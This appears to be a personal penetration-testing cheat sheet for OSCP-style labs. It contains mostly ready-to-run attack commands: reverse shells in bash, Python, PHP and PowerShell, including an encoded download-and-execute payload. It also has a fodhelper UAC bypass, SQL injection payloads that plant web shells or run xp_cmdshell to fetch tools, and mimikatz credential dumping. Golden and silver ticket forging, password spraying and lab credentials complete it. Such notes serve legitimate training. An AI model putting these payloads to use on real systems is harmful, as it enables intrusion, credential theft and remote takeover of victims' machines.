# Table of Content
- [General](#general)
  - [Important Files](#important-files)
  - [Reverse Shell](#reverse-shell)
  - [UAC Bypass](#uac-bypass)
- [PG Grounds & HTB](#pg-grounds-&-htb)
  - [Linux Boxes](#linux-boxes)
- [SQL](#sql)
  - [MYSQL](#mysql)
  - [SQLi](#sqli)
- [Tools](#tools)
  - [feroxbuster](#feroxbuster)
  - [gobuster](#gobuster)
  - [nikto](#nikto)
  - [wfuzz](#wfuzz)
  - [ffuf](#ffuf)
  - [curl](#curl)
  - [wget](#wget)
  - [Python](#python)
  - [Hashcat](#hashcat)
  - [John The Ripper](#john-the-ripper)
  - [pspy](#pspy)
  - [Cross Compiling](#cross-compiling)
  - [xfreerdp](#xfreerdp)
  - [rdesktop](#rdesktop)
  - [Rubeus](#rubeus)
  - [kerbrute](#kerbrute)
  - [Impacket](#impacket)
  - [LDAPSearch](#ldapsearch)
  - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
  - [GMSAPasswordReader](#GMSAPasswordReader)
  - [smbserver](#smbserver)
  - [chisel](#chisel)
  - [Responder](#responder)
  - [Hydra](#hydra)
  - [socat](#socat)
  - [Cadaver](#cadaver)
  - [dig](#dig)
  - [dnsenum](#dnsenum)
- [SSH](#ssh)
  - [SSH KEY](#ssh-key)
  - [SSH Tunneling](#ssh-tunneling)
- [Web Attacks](#web-attacks)
  - [Checklist](#checklist)
  - [General Tips](#general-tips)
  - [API Response](#api-response)
  - [Filemanater](#filemanager)
  - [Input Form](#input-form)
  - [Directory Traversal](#directory-traversal)
  - [Local File Inclusion](#local-file-inclusion)
  - [PHP File Upload Bypass](#php-file-upload-bypass)
- [SMB](#smb)
- [Active Directory](#active-directory)
- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Manual Enumeration](#manual-enumeration)
  - [Service Binary Hijacking](#service-binary-hijacking)
  - [Service DLL Hijacking](#service-dll-hijacking)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Scheduled Tasks](#scheduled-tasks)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Linux Manual Enumeration](#linux-manual-enumeration)
  - [Linux Privilege Strategy](#linux-privilege-strategy)
  - [Common Linux Privilege Escalation](#common-linux-privilege-escalation)
    - [Exploit tar with wilrdcard](#exploit-tar-with-wildcard)
    - [Edit /etc/sudoers](#edit-/etc/sudoers)
    - [Exploit 7z with wildcard](#exploit-7z-with-wildcard)

# General
## Important Files
- Windows
```bash
C:/Users/Administrator/NTUser.dat
C:/xampp/phpMyAdmin/config.inc.php
```

- Linux
```bash
/opt/*
/var/mail
/config/.htusers.php
/proc/self/environ
/proc/self/cmdline
/home/user/.bash_history
/home/user/.bash_aliases
/etc/passwd
/etc/shadow
/etc/aliases

# python related
main.py
app.py
settings.ini
applicationName.config
applicationName.cfg
```

## Reverse Shell
```bash
# bash reverse shell
bash -i >& /dev/tcp/192.168.45.x/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64


# python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# when escaping double quotes
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
# when using os
os.system('nc 192.168.45.175 80 -e /bin/sh')

#netcat reverse shell
nc -e /bin/sh 192.168.45.176 80

#PHP reverse shell
php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'


# Powershell: w powercat
IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell

# when executing with base64 encoded
powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA=

# Powershell: wo powercat
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


#Powershell: Create powershell reverse shell on kali linux
$ kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText



```

## UAC Bypass
- Auto elevation
  - msconfig
  - azman.msc
- Using fodhelper
```bash
# first fire up netcat listener

# method1 
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe

# method2
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.212.194:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

# PG Grounds & HTB
## Linux Boxes

**Twiggy**
  Foothold:
    - curl -v http://192.168.x.x:3000/
    - [Saltstack Exploit]()
  No privesc

**Exfiltrated**
  Foothold:
    - Subrion Exploit with admin:admin credentials
    - Manually uploaded a .phar file
  PrivEsc:
    - Found a cronjob running every minute
    - /opt/image-exif.sh
    - Exiftool exploit and create malicious jpg file

**Astronaut**
  Foothold:
    - [GRAV CMS Exploit](https://github.com/CsEnox/CVE-2021-21425/tree/main)
  PrivEsc:
    - Uncommon setuid binaries
    - [/usr/bin/php7.4 exploit](https://gtfobins.github.io/gtfobins/php/#suid)

**Blackgate**
  Foothold:
    - [Redis 4.0.14 Exploit](https://github.com/Ridter/redis-rce)
  PrivEsc:
    - pwnkit

**Boolean**
  Foothold: 
    - Create a useraccount and go checkout confirmation part. We have to intercept the email edit request with burp and add user[confirmed]=true
    - On upload page, when we try downloading files, we can see cwd which means current working directory. We found directory traversal
    - After checking username list we create an ssh key set and add it to authorized keys and upload it to one of the found users and login as that user using ssh -i
  PrivEsc:
    - Check user's .bash_aliases file: our owner has root key and can login as root
    - ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true

**Clue**
  Foothold:
    - Cassandra Exploit: directory traversal
    - from proc/self/cmdline, we found cassie's name and password -> didn't work for ssh
    - FreeSWITCH mod_event_socket was running so tried exploit and didn't work because password is different
    - Found FreeSWITCH mod_event_socket password through cassandra's exploit
  PrivEsc: pivoting twice
    - Switch user as cassie
    - cassie can run cassandra-web with sudo privilege. since it's running with root privilege, we can grab anything as root
    - Read .bash_history of anthony and figure out that he can login into ssh as root
    - Shell as root

**Law**
  Foothold:
    - [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
    - Change POST /htmLawedTest.php to POST /
    - Exec code I used is included [Proving Grounds Law writeup](https://www.notion.so/Law-28c97105f0134218b24a14a5fcf2bfc3)
  PrivEsc: cronjob that wasn't detected by linpeas
    - Run `./pspy64 -pf -i 1000`
    - Check `CMD: UID=0     PID=34261  | /bin/sh -c /var/www/cleanup.sh`
    - /var/www/cleanup.sh is owned by the initial shell user
    - `echo "nc 192.168.45.175 80 -e /bin/sh" > cleanup.sh`

**GLPI**
  Foothold: [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
    - Exec code I used is included [Proving Grounds GLPI writeup](https://www.notion.so/GLPI-changeuserpass-e1451beb5374490b8de5d1558598aaa4)
  PrivEsc:
    - linpeas: Searching passwords in config PHP files
      - /var/www/glpi/config/config_db.php
      - Found db username and password
      - Found another user's password hash(betty)
      - Couldn't crack the bash
      - Updated Betty's password hash
      - Log in as betty on GLPI and found a ticket about betty's password
      - Login as betty through ssh
    - linpeas: Interesting writable files owned by me or writable by everyone
      - /opt/jetty/jetty-base/webapps
      - There is also an active port on 8080
      - Type: [Jetty RCE exploit](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)



# SQL
## MYSQL: Check if MYSQL is running with privileged account..!
```bash
# mysql login
mysql -u 'root' -h 192.168.183.122 -p

# general usage
show databases;
use user;
show tables;
select * from users_secure;

# Add a new row
INSERT INTO `users` (`id`, `user`, `password`, `date`) VALUES (NULL, 'nick', 'password', '123456789');

# Update/Edit
update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"

# Upload a php file
select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php"

# Move Files
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
```

## SQLi
- mssql command injection
```bash
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --

or
sudo Responder -I tun0 -A
';EXEC xp_dirtree \\192.168.45.176\share
```

- postgresql command injection
```bash
' order by 7 -- //
' union select 1, 1, 1, 1, 1, 1 -- //
' union select 'd', 1, 1, 'd', 'd', null -- //

# Current user
' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //

# Use cast to cause error to get the database
' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
## ERROR
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />

# Use case to find out tables
cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)

# Use cast to find out columns for each table
cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)

# Use cast to find out row for each column
cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)

# Get current user's password!
' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
```

- mysql command injection
```bash
#Error-based Payloads
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

#UNION-based payloads
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

#Blind SQL Injections
#boolean-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
#time-based SQLi
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

#
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

## Tools
### feroxbuster 
```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
```

### gobuster
```bash
gobuster dir -u http://192.168.167.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### nikto
```bash
# basic scanning
nikto -h vulnerable_ip
nikto -h vulnerable_ip -p 80, 8080, 8000
  + OPTIONS: WebDAV enabled (COPY PROPFIND MKCOL UNLOCK LOCK PROPPATCH listed as allowed): indicates that we might be able to use cadaver

# plugins
nikto -h vulnerable_ip --list-plugins
nikto -h 10.10.10.1 -Plugin apacheuser

# verbosing scan
nikto -h vulnerable_ip -Display 1
1: Show any redirects that are given by the web server.
2: Show any cookies received
E: Output any errors

# vulnerability searching
nikto -h vulnerable_ip -Tuning 0
| Category                          | Option |
|-----------------------------------|--------|
| File Upload                       | 0      |
| Misconfigurations / Default Files | 2      |
| Information Disclosure            | 3      |
| Injection                         | 4      |
| Command Execution                 | 8      |
| SQL Injection                     | 9      |

# save your findings
nikto -h http://ip_address -o report.html
```

### wfuzz
```bash
# Fuzz for any files we can find
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=FUZZ

# Fuzz for any files in our current directory
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
```

### ffuf
```bash
# dns(subdomain)
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://marshalled.pg -H 'Host: FUZZ.marshalled.pg' -fs 868
```

### curl
![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
```bash
# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
We can find the stack information as well(ex. saltstack)
curl -v target:port

# directory traversal
curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd

# GET Request
curl -i http://192.168.50.16:5002/users/v1/admin/password

# POST Request
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

# PUT Request
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' -d '{"password": "pwned"}'
```

### wget
```bash
# Download a file and execute it
wget -O - http://192.168.45.175:443/lse.sh | bash
```

### Python
```bash
# When encoding characters;
python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = urllib.parse.quote(original_string); print(url_encoded_string);'
%0A
```

### Hashcat
```bash
# $2a: 3200
($2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS)
hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force

# search for mode
hashcat -h | grep -i "kerberos"

# TGS-REP
hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force

# NTLMv2
hashcat -m 5600 thecybergeek /usr/share/wordlists/rockyou.txt --force

```

### John The Ripper
**john**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt offsec.hash
```

**ssh2john**
```bash
$ ssh2john anita_id_rsa > ssh_key
$ hashcat -m 22911 ./ssh_key /usr/share/wordlists/rockyou.txt --force
```



### pspy
```bash
./pspy64 -pf -i 1000
```

### Cross Compiling
```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
#  when the linker cannot find the winsock library
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### xfreerdp
```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.3.26.190:3333 /cert:ignore
```

### rdesktop
```bash
rdesktop 192.168.216.165
```

### Rubeus
```bash
# kerberoast
./Rubeus.exe kerberoast /format:hashcat /outfile:mssql_hash

# asreproast
./Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
```

### kerbrute
```bash
./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
```


### Impacket
Get AD Users
```bash
impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```

**AS-REP Roasting**
```bash
# When we know that fsmith's hash is available(no password required)
impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass

# When we don't know whos hashes are available and we want to use pete's credentials(correct username/password required)
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

**Kerberoasting**
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

**secretsdump**
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### LDAPSearch focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec' > ldap_search.txt
--> If we get the results
  # cat ldap_search.txt | grep -i "samaccountname" > raw_users.txt
  # cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
  # user users.txt with kerbrute 

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


### Invoke-RunasCs.ps1
```bash
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
```

### GMSAPasswordReader
```bash
.\GMSAPasswordReader.exe --accountname svc_apache$

```

### smbserver
```bash
sudo smbserver.py -smb2support share $(pwd)
sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
```


### gpp-decrypt(Groups.xml)
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
```

### crackmapexec
```bash
# local auth
--local-auth

#smb
crackmapexec smb 192.168.x.x -u '' -p '' --pass-pol
crackmapexec smb 192.168.x.x -u '' -p '' --shares
crackmapexec smb 192.168.x.x -u 'guest' -p '' --shares

crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success

#ssh
crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success

#ftp
crackmapexec ftp 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success

#mssql
crackmapexec mssql 192.168.x.x -u sql_svc -p Dolphin1
crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM

#winrm
crackmapexec winrm 192.168.x.x -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm 192.168.x.x  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'
```

### enum4linux
```bash
enum4linux -a 192.168.201.175
```

### SMBMAP
```bash
smbmap -H 192.168.x.x
smbmap -H 192.168.x.x -u '' -p ''
smbmap -u username -p password -d active.htb -H 192.168.193.5
```

### rpcclient
```bash
rpcclient 10.10.10.10
rpcclient 10.10.10.10 -U '' -N
> enumdomusers
```

### SharpHound.ps1
```bash
powershell -ep bypass
. .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
```

### psexec
```bash
psexec.py active.htb/administrator@10.129.193.5
psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247

When psexec not working
- crackmapexec smb -x whoami
- xfreerdp
- winrm
- See if we can upload files through shares using smbclient
```

### PrintSpoofer
```bash
iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```

### RoguePotato
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```

### GodPotato
```bash
Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd ".\revshell7777.exe"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```
### mimikatz
```bash
privilege::debug
token::elevate

sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::lsa
```

### Invoke-Mimikatz
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
```

### Silver Tickets
![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
```bash
#Get domain SID
whoami /user
#IIS service ntlm from mimikatz or somewhere
#mimikatz silver ticket attack
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
iwr -UseDefaultCredentials http://web04

# on kali machine
ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
```

### Golden Tickets
```bash
# on windows
privilege::debug
lsadump::lsa
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
PsExec64.exe \\DC1 cmd.exe

# on kali
impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
export KRB5CCNAME=./Administrator.ccache     
mousepad /etc/resolv.conf
    add > nameserver 192.168.x.x
(or add dc1.corp.com inside of /etc/hosts file otherwise this attack will fail)
psexec.py Administrator@dc1.corp.com -k -no-pass
```

### chisel
```bash
#chisel
#Run command on attacker machine
chisel server -p 8888 --reverse
#<socks>Run command on Web Server machine
 .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
and edit the proxychains with the port that chisel provided

#When trying to connect to a local port
C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80
```

### responder
```bash
sudo Responder -I tun0 -A
```

### Hydra
```bash
hydra <% tp.frontmatter["RHOST"] %> -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<% tp.frontmatter["RHOST"] %>
hydra -l <% tp.frontmatter["USERNAME"] %> -P /usr/share/wordlists/rockyou.txt <% tp.frontmatter["RHOST"] %> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"

sudo hydra -L /usr/share/wordlists/rockyou.txt -p "<% tp.frontmatter["PASSWORD"] %>" rdp://<% tp.frontmatter["RHOST"] %>
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.frontmatter["RHOST"] %>
```

### socat
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
```

### Cadaver
```bash
cadaver http://192.168.161.122/
```

### dig
```bash
dig @10.10.10.161 AXFR htb.local
```

### dnsenum
```bash
dnsenum 192.168.162.122
```

### bloodhound-python
```bash
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
```

### pyLAPS.py -> get local administrator's password!
```bash
pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"
```

### snmpwalk(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


### Code Snippet to check where our code is executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

### net
**Add user**
```bash
net user nuri password123! /add
net localgroup administrators nuri /add
```

### net on kali
```bash
<Add user to Remote Access group on kali linux using net> 
net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.White%zqwj041FGX -S 192.168.193.30 
```

### PrivestCheck
```bash
```

# SSH
## SSH Key
- See if other users can login as root using ssh key

```bash
# Generate ssh key:
ssh-keygen

# Connect with ssh key:
ssh -i id_rsa root@192.168.x.x

# To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
```

## SSH Tennling
```bash
# Local port forwarding
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Local dynamic port forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Remote port forwarding
sudo systemctl start ssh
